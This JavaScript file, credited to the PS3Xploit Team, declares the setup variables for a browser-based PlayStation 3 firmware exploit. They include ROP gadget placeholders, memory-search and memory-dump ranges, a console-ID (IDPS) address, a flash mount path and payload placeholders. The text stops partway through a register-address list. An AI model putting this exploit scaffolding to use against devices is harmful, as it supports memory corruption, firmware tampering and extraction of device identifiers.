// PS3 Init Variables
// PS3Xploit Team 2018 / ps3xploit.com


var n =  new Date();
var y = n.getFullYear();
var m = ("0" + (n.getMonth() + 1)).slice(-2);
var d = ("0" + n.getDate()).slice(-2);

var br="<br>";
var hr="<hr>";

var cookie_get;
var cookie_set;

// Supported Firmware Versions
var fwCompat = ["4.00","4.10","4.11","4.20","4.21","4.25","4.30","4.31","4.40","4.41","4.45","4.46","4.50","4.53","4.55","4.60","4.65","4.66","4.70","4.75","4.76","4.78","4.80","4.81","4.82"];
var vshType="";

// Offsets and Compatibility
var isPlaystation = false;
var disableFeatures = false;
var ua = navigator.userAgent;
var uaStringCheck = ua.substring(ua.indexOf("5.0 (") + 5, ua.indexOf(") Apple") - 7);
var fwVersion = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));

// Set Offset Defaults
var g_toc;
var g_1;// leftover webkit code
var g_2;// initial stack control
var g_set_r4_thru_r11;// set r4-r11 + r29-r31
var g_set_r3_from_r29;// set r3 from r29
var g_set_r3_with_ld;
var g_set_r3_with_lwz_from_r31;
var g_set_r3_and_clear;
var g_set_r3_and_sc;
var g_set_r5_from_r29;
var g_set_r20_thru_r31;
var g_set_r31_from_r23;
var g_set_r31_E8;
var g_set_r31_F8;
var g_store_r3_into_r31;
var g_sc_80;// sc then load r0 from r1+0x80
var g_sc_90;// sc then load r0 from r1+0x90
var g_sc_A0;// sc then load r0 from r1+0xA0
var g_sc_set_r3_from_r9;// set r3 from r9 and sc
var g_sc_set_r3_from_r10;// set r3 from r10 and sc
var g_sc_set_r3_with_lwz_from_r31;
var g_fsopen_write_close;
var g_cellfs_open_write_close1;
var g_mount_flash;
var g_unk_user_id1;
var g_unk_user_id2;
var g_unk_registry1;
var g_unk_registry_backup;
var g_unk_registry_restore;
var g_unk_explore_plugin_bin;
var g_unk_psp_rif;
var g_unk_login_xmb;
var g_xmb_restore;
var g_unk_pkg1;
var g_unk_sync;
var g_unk_bg_download1;
var g_unk_bg_download2;
var g_unk_post_update1;
var g_unk_post_update2;
var g_unk_crash_report1;
var g_unk_http_client;
var g_unk_fsck;
var g_unk_debug1;
var g_tty_write;
var g_unk_act_dat1;
var g_unk_act_dat2;
var g_unk_rif1;
var g_unk_rif2;
var g_unk_rif3;
var g_unk_exdata_edat1;
var g_unk_thread1;
var g_unk_prx1;
var g_unk_mount_bdvd;
var g_unk_mount_fat;
var g_unk_display_res1;
var g_unk_display_res2;
var g_unk_game_res;
var g_unk_alpha_numeric;
var g_unk_update_game_data;

// Exits
var g_init_reboot;
var g_init_shutdown;
var g_exit_chain;// graceful exit
var g_init_shutdown;// init beep and shutdown

// Subs
var s_cellfs_write;
var s_create_new_user;
var s_mount_hdd1;
var s_ps_button_bp;
var s_remove_act_dat;
var s_remove_exdata;
var s_start_busy_icon;
var s_unk_create_new_user2;
var s_unk_create_new_user3;
var s_unk_flash2_post_update;
var s_unk_game_exec;
var s_unk_game_debug_pafjob;
var s_unk_manager_signout;
var s_unk_mount_hdd;
var s_unk_network_printf;
var s_unk_npmt;
var s_unk_npmt2;
var s_unk_psx_ps2;
var s_unk_premo_plugin;
var s_unk_upload_util;

// Exports
var e_cellfs_closedir;
var e_cellfs_opendir;
var e_cellfs_readdir;
var e_fopen_write_close;
var e_stdc_opendir;
var e_stdc_readdir;
var e_unk_boot2;
var e_unk_game_plugin;
var e_unk_vsh_printf;
var e_unk_xmb_plugin;
var e_turnoff;
var e_turnoff2;


var debug_mode=false;// log debug to screen
var disable_trigger=false;// used for testing with alert

var page_args_set=false;
var disable_reboot=true;

// Auto-Reload Page Flag
var auto_reload=false;

// Stackframe Chain Placeholder
var chain_stackframe="";

// Memory Searching
var firstRun=true;
var t_out=0;
var total_loops=0;
var max_loops=40;
var failCount=0;
var failCountMax=1;
var search_max_threshold = 70*0x100000;
var search_max_threshold_backup = 70*0x100000;
var search_base_offset = 0x80200000;// 0x80190000
var search_base_offset_min = 0x80200000;
var search_base_offset_max = search_base_offset_min+0x240000;
var search_base_offset_adjust=0x100000;
var search_base_offset_adjust_jump2=0x100000;
var search_base_offset_adjust_jump1=0x100000;
var search_range_size = 0x200000;

// store found offsets
var found_offsets=[];
var base_offsets=[];
var stack_offsets=[];
var jump2_offsets=[];
var jump1_offsets=[];

// used for dynamic search
var _addr;
		
// Default PlaceHolder
var ph=0;

// Path Address Pointers
var stackframe_bin_fp;
var usb_fp;
var usb_fp2;
var hdd_fp;
var hdd_fp2;
var path_fp;
var path_fp2;
var path_src_fp;
var path_dest_fp;
var file_mode_fp;

// File Descriptor
var usb_fd;
var usb_fd2;
var hdd_fd;
var hdd_fd2;
var fd;
var fd2;

// Other Pointers
var magic;
var magic2;

// Used for string verification
var base=0;
var stk=0;
var j2=0;
var j1=0;
var base_found=false;
var stackframe_found=false;
var j2_found=false;
var j1_found=false;
var base_verified=false;
var stackframe_verified=false;
var j2_verified=false;
var j1_verified=false;
var allOffsetsFound=false;
var allOffsetsVerified=false;
var result_msg="";

// Required Jumps
var base_fp=1;
var stack_frame=1;
var jump_2=1;
var jump_1=1;
var verify_offsets=true;
var verify_stackframe=true;
var offsets_verified=false;// superseded

// Default Addresses
var base_fp_addr=0;
var stackframe_bin_addr=0
var usb_fp_addr=0;
var usb_fp2_addr=0;
var hdd_fp_addr=0;
var hdd_fp2_addr=0;
var path_fp_addr=0;
var path_fp2_addr=0;
var path_src_fp_addr=0;
var path_dest_fp_addr=0;
var fd_addr=0;
var fd2_addr=0;
var stack_frame_addr=0;
var jump_2_addr=0;
var jump_1_addr=0
var file_mode_fp_addr=0;
var write_bytes_addr=0;
var magic_addr=0;
var magic2_addr=0;

var hdd_fp_addr_backup=0;
var usb_fp_addr_backup=0;

// Search Offset Colors
var color="#7700DA";
var colortext="#EB6C03";
var colorActive="#279947";
var colorSuccess="#FFFFFF";
var colorVerified="#EB6C03";
var colorVerifiedFake="#5B0C03";
var base_fp_color=color;
var stack_frame_color=color;
var jump_2_color=color;
var jump_1_color=color;
var base_fp_acolor=colorActive;
var stack_frame_acolor=colorActive;
var jump_2_acolor=colorActive;
var jump_1_acolor=colorActive;
var base_fp_vcolor=colorVerified;
var stack_frame_vcolor=colorVerified;
var jump_2_vcolor=colorVerified;
var jump_1_vcolor=colorVerified;

var code_cave_1=0x20900000;// 0x20900000-0x209FFFFF
var code_cave_2=0xC0900000;// 0xC0900000-0xC1C00000

var restore_stack=0x8FD8DCC0;

var isCompatCFW=false;
var isFW356=false;

var write_protect=true;

var str2u_adjusted=false;// used for str2u

var write_bytes=0x00000000;// used for db_rebuild and others
var dummy_text="Hello From PS3Xploit Team!";

// MemDump Presets
var mem_preset_0_size=0x000FFFFF;
var mem_preset_0_start=0x00000000;
var mem_preset_0_end=0x000FFFFF;
var mem_preset_1_size=0x02E2FFFF;
var mem_preset_1_start=0x00010000;
var mem_preset_1_end=0x02E3FFFF;
var mem_preset_2_size=0x0052FFFF;
var mem_preset_2_start=0x02F60000;
var mem_preset_2_end=0x0348FFFF;
var mem_preset_3_size=0x00DA146F;// 0x00DAFFFF
var mem_preset_3_start=0x03760000;
var mem_preset_3_end=0x0450FFFF;
var mem_preset_4_size=0x005EFFFF;
var mem_preset_4_start=0x04760000;
var mem_preset_4_end=0x04D4FFFF;
var mem_preset_5_size=0x0032FFFF;
var mem_preset_5_start=0x10000000;
var mem_preset_5_end=0x1032FFFF;
var mem_preset_6_size=0x0018FFFF;
var mem_preset_6_start=0x104A0000;
var mem_preset_6_end=0x1062FFFF;
var mem_preset_7_size=0x009FFFFF;
var mem_preset_7_start=0x20000000;
var mem_preset_7_end=0x209FFFFF;
var mem_preset_8_size=0x013FFFFF;
var mem_preset_8_start=0x20E00000;
var mem_preset_8_end=0x221FFFFF;
var mem_preset_9_size=0x0003FFFF;
var mem_preset_9_start=0x30000000;
var mem_preset_9_end=0x3003FFFF;
var mem_preset_10_size=0x0000FFFF;
var mem_preset_10_start=0x40000000;
var mem_preset_10_end=0x4000FFFF;
var mem_preset_11_size=0x0000FFFF;
var mem_preset_11_start=0x50000000;
var mem_preset_11_end=0x5000FFFF;
var mem_preset_12_size=0x0000FFFF;
var mem_preset_12_start=0x60000000;
var mem_preset_12_end=0x6000FFFF;
var mem_preset_13_size=0x0000FFFF;
var mem_preset_13_start=0x60100000;
var mem_preset_13_end=0x6010FFFF;
var mem_preset_14_size=0x0000FFFF;
var mem_preset_14_start=0x60200000;
var mem_preset_14_end=0x6020FFFF;
var mem_preset_15_size=0x0000FFFF;
var mem_preset_15_start=0x60300000;
var mem_preset_15_end=0x6030FFFF;
var mem_preset_16_size=0x01FFFFFF;
var mem_preset_16_start=0x70000000;
var mem_preset_16_end=0x71FFFFFF;
var mem_preset_17_size=0x7FFFFFFF;
var mem_preset_17_start=0x80000000;
var mem_preset_17_end=0x8FFFFFFF;
var mem_preset_18_size=0x0FDFFFFF;
var mem_preset_18_start=0xC0000000;
var mem_preset_18_end=0xCFDFFFFF;
var mem_preset_19_size=0x0001FFFF;
var mem_preset_19_start=0xD0010000;
var mem_preset_19_end=0xD002FFFF;
var mem_preset_20_size=0x0001FFFF;
var mem_preset_20_start=0xD0050000;
var mem_preset_20_end=0xD006FFFF;
var mem_preset_21_size=0x0002FFFF;
var mem_preset_21_start=0xD0080000;
var mem_preset_21_end=0xD00AFFFF;
var mem_preset_22_size=0x0003FFFF;
var mem_preset_22_start=0xD00C0000;
var mem_preset_22_end=0xD00FFFFF;
var mem_preset_23_size=0x0008FFFF;
var mem_preset_23_start=0xD0130000;
var mem_preset_23_end=0xD01BFFFF;


// These used in chain at diff spots
var restore_stack1=0x8FD8DCC0;
var restore_stack2=0x8FD8DCC0;
var restore_stack3=0x8FD8DCC0;
var restore_stack4=0x8FD8DCC0;
var restore_stack4a=0x8FD8DCC0;
var restore_stack5=0x8FD8DCC0;
var restore_stack6=0x8FD8DCC0;
var restore_stack7=0x8FD8DCC0;
var restore_stack8=0x8FD8DCC0;
var restore_stack9=0x8FD8DCC0;

// TESTING ONLY
//var restore_stack1=0x8FD8DCC1;
//var restore_stack2=0x8FD8DCC2;
//var restore_stack3=0x8FD8DCC3;
//var restore_stack4=0x8FD8DCC4;
//var restore_stack5=0x8FD8DCC5;
//var restore_stack6=0x8FD8DCC6;
//var restore_stack7=0x8FD8DCC7;
//var restore_stack8=0x8FD8DCC8;
//var restore_stack9=0x8FD8DCC9;

var temp_read_addr=0x89F00000;

var thread_id;

var addr_start=0x80000000;
var addr_end=0x8FFFFFFF;

// IDPS stored in memory (using DEX as default, if not match, should return all 0)
var addr_idps=0x735F98;
var out_idps="";

// PSID alternate variables
var addr_psid;
var out_psid="";

var log_div;
var msg="";// generic message text placeholder
var user_id="00000001";
var user_home_path=""

var msg_override_text="";// generic message text placeholder
var msg_override_seen=false;

// Flash Types 0=NAND / 1=NOR / 2=EMMC
var type=1;
var ftype=1;
var flash_type_select=1;
var flash_type_text="NOR";

// Storage Related
var flash_type;
var st_sec;
var device_flag=0x01000000;
var nand_flag=0x00000001;
var emmc_flag=0x00000001;
var nor_flag=0x00000004;
var hdd_flag=0x00000007;
var device_id=0x00000004;
var rosdump_addr=0x8D000000;
var step_sector=0x1;
var file_size=0x00000140;
var file_size_display="0x00000140";
var file_size_input=0x00000140;
var file_size_input_addr=0x8A000100;
var useAutoSize=false;

var file_descriptor;
var path_type;
var path_src;
var path_dest;
var title_id="PS3XPLOIT";

var mount_device="CELL_FS_IOS:BUILTIN_FLSH1";
var mount_fs="CELL_FS_FAT";
var mount_path="/dev_blind";

var db_rebuild_bytes=0x000003E9;
var memdump_addr=0x80000000;
var memdump_addr_temp=0x80000000;
var memdump_addr_text="80000000";
var memdump_size=0x10000000;
var memdump_size_temp=0x10000000;
var memdump_size_text="10000000";
var memdump_end=0x8FFFFFFF;
var memdump_end_text="8FFFFFFF";

var rtn_val=0x00000000;
var rtn_val_seen=false;
var rtn_val_addr=0x8A000100;

var minver=0x00000000;
var minver_seen=false;
var minver_addr=0x89FFFFF0;

var temps_both_seen=false;

var temp_cell=0x00000000;
var temp_cell_hex=0x00000000;
var temp_cell_hexf=0x00000000;
var temp_cell_hexc=0x00000000;
var temp_cell_hex_final=0x00000000;
var temp_cell_addr=0x8C000100;

var temp_rsx=0x00000000;
var temp_rsx_hex=0x00000000;
var temp_rsx_hexf=0x00000000;
var temp_rsx_hexc=0x00000000;
var temp_rsx_hex_final=0x00000000;
var temp_rsx_addr=0x8C000110;

// Temp Addresses For Storing Values
var temp_addr;
var temp_addr_8A=0x8A000000;
var temp_addr_8B=0x8B000000;
var temp_addr_8C=0x8C000000;
var temp_addr_8D=0x8D000000;
var temp_addr_8E=0x8E000000;
var temp_addr_8F=0x8F000000;
var temp_stack_write=0x80140000;
var stackframe_storage=0x89000000;

// gadget placeholder will shut down the console
var gadget_temp=0x0C6730;

var payload_type;
var payload_hex="payload";
var payload_hex_ext="jpg";
var payload_hex_active=false;
var payload_hex_select;
var media_random="";

var padding1=0x00000000;
var padding2=0x00000000;
var padding3=0x00000000;
var padding4=0x00000000;

// Other jumps or values to set in chain
var extra1=0x80000001;
var extra2=0x80000002;
var extra3=0x80000003;
var extra4=0x80000004;
var extra5=0x80000005;
var extra6=0x80000006;
var extra7=0x80000007;
var extra8=0x80000008;

// JumpTo Placeholders
var a1_jumpto=0x01010101;
var a2_jumpto=0x02020202;
var a3_jumpto=0x03030303;
var a4_jumpto=0x04040404;
var a5_jumpto=0x05050505;
var a6_jumpto=0x06060606;
var a7_jumpto=0x07070707;
var a8_jumpto=0x08080808;
var a9_jumpto=0x09090909;
var a10_jumpto=0x10101010;
var a11_jumpto=0x11111111;
var a12_jumpto=0x12121212;
var a13_jumpto=0x13131313;
var a14_jumpto=0x14141414;
var a15_jumpto=0x15151515;
var a16_jumpto=0x16161616;
var a17_jumpto=0x17171717;
var a18_jumpto=0x18181818;
var a19_jumpto=0x19191919;
var a20_jumpto=0x20202020;
var a21_jumpto=0x21212121;
var a22_jumpto=0x22222222;
var a23_jumpto=0x23232323;
var a24_jumpto=0x24242424;
var a25_jumpto=0x25252525;
var a26_jumpto=0x26262626;
var a27_jumpto=0x27272727;
var a28_jumpto=0x28282828;
var a29_jumpto=0x29292929;
var a30_jumpto=0x30303030;
var a31_jumpto=0x31313131;
var a32_jumpto=0x32323232;
var a33_jumpto=0x33333333;

// Find a better way for this later haha
var a1_r0=0x80140100;
var a1_r1=0x80140101;
var a1_r2=0x80140102;
var a1_r3=0x80140103;
var a1_r4=0x80140104;
var a1_r5=0x80140105;
var a1_r6=0x80140106;
var a1_r7=0x80140107;
var a1_r8=0x80140108;
var a1_r9=0x80140109;
var a1_r10=0x80140110;
var a1_r11=0x80140111;
var a1_r12=0x80140112;
var a1_r13=0x80140113;
var a1_r14=0x80140114;
var a1_r15=0x80140115;
var a1_r16=0x80140116;
var a1_r17=0x80140117;
var a1_r18=0x80140118;
var a1_r19=0x80140119;
var a1_r20=0x80140120;
var a1_r21=0x80140121;
var a1_r22=0x80140122;
var a1_r23=0x80140123;
var a1_r24=0x80140124;
var a1_r25=0x80140125;
var a1_r26=0x80140126;
var a1_r27=0x80140127;
var a1_r28=0x80140128;
var a1_r29=0x80140129;
var a1_r30=0x80140130;
var a1_r31=0x80140131;

var a2_r0=0x80140200;
var a2_r1=0x80140201;
var a2_r2=0x80140202;
var a2_r3=0x80140203;
var a2_r4=0x80140204;
var a2_r5=0x80140205;
var a2_r6=0x80140206;
var a2_r7=0x80140207;
var a2_r8=0x80140208;
var a2_r9=0x80140209;
var a2_r10=0x80140210;
var a2_r11=0x80140211;
var a2_r12=0x80140212;
var a2_r13=0x80140213;
var a2_r14=0x80140214;
var a2_r15=0x80140215;
var a2_r16=0x80140216;
var a2_r17=0x80140217;
var a2_r18=0x80140218;
var a2_r19=0x80140219;
var a2_r20=0x80140220;
var a2_r21=0x80140221;
var a2_r22=0x80140222;
var a2_r23=0x80140223;
var a2_r24=0x80140224;
var a2_r25=0x80140225;
var a2_r26=0x80140226;
var a2_r27=0x80140227;
var a2_r28=0x80140228;
var a2_r29=0x80140229;
var a2_r30=0x80140230;
var a2_r31=0x80140231;

var a3_r0=0x80140300;
var a3_r1=0x80140301;
var a3_r2=0x80140302;
var a3_r3=0x80140303;
var a3_r4=0x80140304;
var a3_r5=0x80140305;
var a3_r6=0x80140306;
var a3_r7=0x80140307;
var a3_r8=0x80140308;
var a3_r9=0x80140309;
var a3_r10=0x80140310;
var a3_r11=0x80140311;
var a3_r12=0x80140312;
var a3_r13=0x80140313;
var a3_r14=0x80140314;
var a3_r15=0x80140315;
var a3_r16=0x80140316;
var a3_r17=0x80140317;
var a3_r18=0x80140318;
var a3_r19=0x80140319;
var a3_r20=0x80140320;
var a3_r21=0x80140321;
var a3_r22=0x80140322;
var a3_r23=0x80140323;
var a3_r24=0x80140324;
var a3_r25=0x80140325;
var a3_r26=0x80140326;
var a3_r27=0x80140327;
var a3_r28=0x80140328;
var a3_r29=0x80140329;
var a3_r30=0x80140330;
var a3_r31=0x80140331;

var a4_r0=0x80140400;
var a4_r1=0x80140401;
var a4_r2=0x80140402;
var a4_r3=0x80140403;
var a4_r4=0x80140404;
var a4_r5=0x80140405;
var a4_r6=0x80140406;
var a4_r7=0x80140407;
var a4_r8=0x80140408;
var a4_r9=0x80140409;
var a4_r10=0x80140410;
var a4_r11=0x80140411;
var a4_r12=0x80140412;
var a4_r13=0x80140413;
var a4_r14=0x80140414;
var a4_r15=0x80140415;
var a4_r16=0x80140416;
var a4_r17=0x80140417;
var a4_r18=0x80140418;
var a4_r19=0x80140419;
var a4_r20=0x80140420;
var a4_r21=0x80140421;
var a4_r22=0x80140422;
var a4_r23=0x80140423;
var a4_r24=0x80140424;
var a4_r25=0x80140425;
var a4_r26=0x80140426;
var a4_r27=0x80140427;
var a4_r28=0x80140428;
var a4_r29=0x80140429;
var a4_r30=0x80140430;
var a4_r31=0x80140431;

var a5_r0=0x80140500;
var a5_r1=0x80140501;
var a5_r2=0x80140502;
var a5_r3=0x80140503;
var a5_r4=0x80140504;
var a5_r5=0x80140505;
var a5_r6=0x80140506;
var a5_r7=0x80140507;
var a5_r8=0x80140508;
var a5_r9=0x80140509;
var a5_r10=0x80140510;
var a5_r11=0x80140511;
var a5_r12=0x80140512;
var a5_r13=0x80140513;
var a5_r14=0x80140514;
var a5_r15=0x80140515;
var a5_r16=0x80140516;
var a5_r17=0x80140517;
var a5_r18=0x80140518;
var a5_r19=0x80140519;
var a5_r20=0x80140520;
var a5_r21=0x80140521;
var a5_r22=0x80140522;
var a5_r23=0x80140523;
var a5_r24=0x80140524;
var a5_r25=0x80140525;
var a5_r26=0x80140526;
var a5_r27=0x80140527;
var a5_r28=0x80140528;
var a5_r29=0x80140529;
var a5_r30=0x80140530;
var a5_r31=0x80140531;

var a6_r0=0x80140600;
var a6_r1=0x80140601;
var a6_r2=0x80140602;
var a6_r3=0x80140603;
var a6_r4=0x80140604;
var a6_r5=0x80140605;
var a6_r6=0x80140606;
var a6_r7=0x80140607;
var a6_r8=0x80140608;
var a6_r9=0x80140609;
var a6_r10=0x80140610;
var a6_r11=0x80140611;
var a6_r12=0x80140612;
var a6_r13=0x80140613;
var a6_r14=0x80140614;
var a6_r15=0x80140615;
var a6_r16=0x80140616;
var a6_r17=0x80140617;
var a6_r18=0x80140618;
var a6_r19=0x80140619;
var a6_r20=0x80140620;
var a6_r21=0x80140621;
var a6_r22=0x80140622;
var a6_r23=0x80140623;
var a6_r24=0x80140624;
var a6_r25=0x80140625;
var a6_r26=0x80140626;
var a6_r27=0x80140627;
var a6_r28=0x80140628;
var a6_r29=0x80140629;
var a6_r30=0x80140630;
var a6_r31=0x80140631;

var a7_r0=0x80140700;
var a7_r1=0x80140701;
var a7_r2=0x80140702;
var a7_r3=0x80140703;
var a7_r4=0x80140704;
var a7_r5=0x80140705;
var a7_r6=0x80140706;
var a7_r7=0x80140707;
var a7_r8=0x80140708;
var a7_r9=0x80140709;
var a7_r10=0x80140710;
var a7_r11=0x80140711;
var a7_r12=0x80140712;
var a7_r13=0x80140713;
var a7_r14=0x80140714;
var a7_r15=0x80140715;
var a7_r16=0x80140716;
var a7_r17=0x80140717;
var a7_r18=0x80140718;
var a7_r19=0x80140719;
var a7_r20=0x80140720;
var a7_r21=0x80140721;
var a7_r22=0x80140722;
var a7_r23=0x80140723;
var a7_r24=0x80140724;
var a7_r25=0x80140725;
var a7_r26=0x80140726;
var a7_r27=0x80140727;
var a7_r28=0x80140728;
var a7_r29=0x80140729;
var a7_r30=0x80140730;
var a7_r31=0x80140731;

var a8_r0=0x80140800;
var a8_r1=0x80140801;
var a8_r2=0x80140802;
var a8_r3=0x80140803;
var a8_r4=0x80140804;
var a8_r5=0x80140805;
var a8_r6=0x80140806;
var a8_r7=0x80140807;
var a8_r8=0x80140808;
var a8_r9=0x80140809;
var a8_r10=0x80140810;
var a8_r11=0x80140811;
var a8_r12=0x80140812;
var a8_r13=0x80140813;
var a8_r14=0x80140814;
var a8_r15=0x80140815;
var a8_r16=0x80140816;
var a8_r17=0x80140817;
var a8_r18=0x80140818;
var a8_r19=0x80140819;
var a8_r20=0x80140820;
var a8_r21=0x80140821;
var a8_r22=0x80140822;
var a8_r23=0x80140823;
var a8_r24=0x80140824;
var a8_r25=0x80140825;
var a8_r26=0x80140826;
var a8_r27=0x80140827;
var a8_r28=0x80140828;
var a8_r29=0x80140829;
var a8_r30=0x80140830;
var a8_r31=0x80140831;

var a9_r0=0x80140900;
var a9_r1=0x80140901;
var a9_r2=0x80140902;
var a9_r3=0x80140903;
var a9_r4=0x80140904;
var a9_r5=0x80140905;
var a9_r6=0x80140906;
var a9_r7=0x80140907;
var a9_r8=0x80140908;
var a9_r9=0x80140909;
var a9_r10=0x80140910;
var a9_r11=0x80140911;
var a9_r12=0x80140912;
var a9_r13=0x80140913;
var a9_r14=0x80140914;
var a9_r15=0x80140915;
var a9_r16=0x80140916;
var a9_r17=0x80140917;
var a9_r18=0x80140918;
var a9_r19=0x80140919;
var a9_r20=0x80140920;
var a9_r21=0x80140921;
var a9_r22=0x80140922;
var a9_r23=0x80140923;
var a9_r24=0x80140924;
var a9_r25=0x80140925;
var a9_r26=0x80140926;
var a9_r27=0x80140927;
var a9_r28=0x80140928;
var a9_r29=0x80140929;
var a9_r30=0x80140930;
var a9_r31=0x80140931;

var a10_r0=0x80141000;
var a10_r1=0x80141001;
var a10_r2=0x80141002;
var a10_r3=0x80141003;
var a10_r4=0x80141004;
var a10_r5=0x80141005;
var a10_r6=0x80141006;
var a10_r7=0x80141007;
var a10_r8=0x80141008;
var a10_r9=0x80141009;
var a10_r10=0x80141010;
var a10_r11=0x80141011;
var a10_r12=0x80141012;
var a10_r13=0x80141013;
var a10_r14=0x80141014;
var a10_r15=0x80141015;
var a10_r16=0x80141016;
var a10_r17=0x80141017;
var a10_r18=0x80141018;
var a10_r19=0x80141019;
var a10_r20=0x80141020;
var a10_r21=0x80141021;
var a10_r22=0x80141022;
var a10_r23=0x80141023;
var a10_r24=0x80141024;
var a10_r25=0x80141025;
var a10_r26=0x80141026;
var a10_r27=0x80141027;
var a10_r28=0x80141028;
var a10_r29=0x80141029;
var a10_r30=0x80141030;
var a10_r31=0x80141031;

var a11_r0=0x80141100;
var a11_r1=0x80141101;
var a11_r2=0x80141102;
var a11_r3=0x80141103;
var a11_r4=0x80141104;
var a11_r5=0x80141105;
var a11_r6=0x80141106;
var a11_r7=0x80141107;
var a11_r8=0x80141108;
var a11_r9=0x80141109;
var a11_r10=0x80141110;
var a11_r11=0x80141111;
var a11_r12=0x80141112;
var a11_r13=0x80141113;
var a11_r14=0x80141114;
var a11_r15=0x80141115;
var a11_r16=0x80141116;
var a11_r17=0x80141117;
var a11_r18=0x80141118;
var a11_r19=0x80141119;
var a11_r20=0x80141120;
var a11_r21=0x80141121;
var a11_r22=0x80141122;
var a11_r23=0x80141123;
var a11_r24=0x80141124;
var a11_r25=0x80141125;
var a11_r26=0x80141126;
var a11_r27=0x80141127;
var a11_r28=0x80141128;
var a11_r29=0x80141129;
var a11_r30=0x80141130;
var a11_r31=0x80141131;

var a12_r0=0x80141200;
var a12_r1=0x80141201;
var a12_r2=0x80141202;
var a12_r3=0x80141203;
var a12_r4=0x80141204;
var a12_r5=0x80141205;
var a12_r6=0x80141206;
var a12_r7=0x80141207;
var a12_r8=0x80141208;
var a12_r9=0x80141209;
var a12_r10=0x80141210;
var a12_r11=0x80141211;
var a12_r12=0x80141212;
var a12_r13=0x80141213;
var a12_r14=0x80141214;
var a12_r15=0x80141215;
var a12_r16=0x80141216;
var a12_r17=0x80141217;
var a12_r18=0x80141218;
var a12_r19=0x80141219;
var a12_r20=0x80141220;
var a12_r21=0x80141221;
var a12_r22=0x80141222;
var a12_r23=0x80141223;
var a12_r24=0x80141224;
var a12_r25=0x80141225;
var a12_r26=0x80141226;
var a12_r27=0x80141227;
var a12_r28=0x80141228;
var a12_r29=0x80141229;
var a12_r30=0x80141230;
var a12_r31=0x80141231;

var a13_r0=0x80141300;
var a13_r1=0x80141301;
var a13_r2=0x80141302;
var a13_r3=0x80141303;
var a13_r4=0x80141304;
var a13_r5=0x80141305;
var a13_r6=0x80141306;
var a13_r7=0x80141307;
var a13_r8=0x80141308;
var a13_r9=0x80141309;
var a13_r10=0x80141310;
var a13_r11=0x80141311;
var a13_r12=0x80141312;
var a13_r13=0x80141313;
var a13_r14=0x80141314;
var a13_r15=0x80141315;
var a13_r16=0x80141316;
var a13_r17=0x80141317;
var a13_r18=0x80141318;
var a13_r19=0x80141319;
var a13_r20=0x80141320;
var a13_r21=0x80141321;
var a13_r22=0x80141322;
var a13_r23=0x80141323;
var a13_r24=0x80141324;
var a13_r25=0x80141325;
var a13_r26=0x80141326;
var a13_r27=0x80141327;
var a13_r28=0x80141328;
var a13_r29=0x80141329;
var a13_r30=0x80141330;
var a13_r31=0x80141331;

var a14_r0=0x80141400;
var a14_r1=0x80141401;
var a14_r2=0x80141402;
var a14_r3=0x80141403;
var a14_r4=0x80141404;
var a14_r5=0x80141405;
var a14_r6=0x80141406;
var a14_r7=0x80141407;
var a14_r8=0x80141408;
var a14_r9=0x80141409;
var a14_r10=0x80141410;
var a14_r11=0x80141411;
var a14_r12=0x80141412;
var a14_r13=0x80141413;
var a14_r14=0x80141414;
var a14_r15=0x80141415;
var a14_r16=0x80141416;
var a14_r17=0x80141417;
var a14_r18=0x80141418;
var a14_r19=0x80141419;
var a14_r20=0x80141420;
var a14_r21=0x80141421;
var a14_r22=0x80141422;
var a14_r23=0x80141423;
var a14_r24=0x80141424;
var a14_r25=0x80141425;
var a14_r26=0x80141426;
var a14_r27=0x80141427;
var a14_r28=0x80141428;
var a14_r29=0x80141429;
var a14_r30=0x80141430;
var a14_r31=0x80141431;

var a15_r0=0x80141500;
var a15_r1=0x80141501;
var a15_r2=0x80141502;
var a15_r3=0x80141503;
var a15_r4=0x80141504;
var a15_r5=0x80141505;
var a15_r6=0x80141506;
var a15_r7=0x80141507;
var a15_r8=0x80141508;
var a15_r9=0x80141509;
var a15_r10=0x80141510;
var a15_r11=0x80141511;
var a15_r12=0x80141512;
var a15_r13=0x80141513;
var a15_r14=0x80141514;
var a15_r15=0x80141515;
var a15_r16=0x80141516;
var a15_r17=0x80141517;
var a15_r18=0x80141518;
var a15_r19=0x80141519;
var a15_r20=0x80141520;
var a15_r21=0x80141521;
var a15_r22=0x80141522;
var a15_r23=0x80141523;
var a15_r24=0x80141524;
var a15_r25=0x80141525;
var a15_r26=0x80141526;
var a15_r27=0x80141527;
var a15_r28=0x80141528;
var a15_r29=0x80141529;
var a15_r30=0x80141530;
var a15_r31=0x80141531;

var a16_r0=0x80141600;
var a16_r1=0x80141601;
var a16_r2=0x80141602;
var a16_r3=0x80141603;
var a16_r4=0x80141604;
var a16_r5=0x80141605;
var a16_r6=0x80141606;
var a16_r7=0x80141607;
var a16_r8=0x80141608;
var a16_r9=0x80141609;
var a16_r10=0x80141610;
var a16_r11=0x80141611;
var a16_r12=0x80141612;
var a16_r13=0x80141613;
var a16_r14=0x80141614;
var a16_r15=0x80141615;
var a16_r16=0x80141616;
var a16_r17=0x80141617;
var a16_r18=0x80141618;
var a16_r19=0x80141619;
var a16_r20=0x80141620;
var a16_r21=0x80141621;
var a16_r22=0x80141622;
var a16_r23=0x80141623;
var a16_r24=0x80141624;
var a16_r25=0x80141625;
var a16_r26=0x80141626;
var a16_r27=0x80141627;
var a16_r28=0x80141628;
var a16_r29=0x80141629;
var a16_r30=0x80141630;
var a16_r31=0x80141631;

var a17_r0=0x80141700;
var a17_r1=0x80141701;
var a17_r2=0x80141702;
var a17_r3=0x80141703;
var a17_r4=0x80141704;
var a17_r5=0x80141705;
var a17_r6=0x80141706;
var a17_r7=0x80141707;
var a17_r8=0x80141708;
var a17_r9=0x80141709;
var a17_r10=0x80141710;
var a17_r11=0x80141711;
var a17_r12=0x80141712;
var a17_r13=0x80141713;
var a17_r14=0x80141714;
var a17_r15=0x80141715;
var a17_r16=0x80141716;
var a17_r17=0x80141717;
var a17_r18=0x80141718;
var a17_r19=0x80141719;
var a17_r20=0x80141720;
var a17_r21=0x80141721;
var a17_r22=0x80141722;
var a17_r23=0x80141723;
var a17_r24=0x80141724;
var a17_r25=0x80141725;
var a17_r26=0x80141726;
var a17_r27=0x80141727;
var a17_r28=0x80141728;
var a17_r29=0x80141729;
var a17_r30=0x80141730;
var a17_r31=0x80141731;

var a18_r0=0x80141800;
var a18_r1=0x80141801;
var a18_r2=0x80141802;
var a18_r3=0x80141803;
var a18_r4=0x80141804;
var a18_r5=0x80141805;
var a18_r6=0x80141806;
var a18_r7=0x80141807;
var a18_r8=0x80141808;
